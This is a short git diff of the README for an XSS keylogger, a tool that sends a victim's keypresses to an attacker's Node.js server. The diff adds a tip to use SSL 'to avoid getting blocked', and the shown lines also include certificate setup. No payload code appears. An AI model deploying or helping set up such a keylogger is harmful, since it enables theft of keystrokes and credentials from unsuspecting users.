@@ -1,5 +1,5 @@
 # XSS-Keylogger
-Simple script that sends every keypresses by victim to a simple Node.js app on attacker side
+Simple script that sends every keypresses by victim to a simple Node.js app on attacker side.
 
 # Usage
 ## Attacker Side:
@@ -23,6 +23,9 @@ Define the location of .crt and .key files in [server.js](server.js) file:
         key: fs.readFileSync('{.key file location}'),
         cert: fs.readFileSync('{.crt file location}'),
         }, app);
+
+**Better to use with SSL to avoid getting blocked**
+How to create a self-signed certificate using openssl: [LINK](https://devopscube.com/create-self-signed-certificates-openssl/) 
 
 Run Node.js server:
 
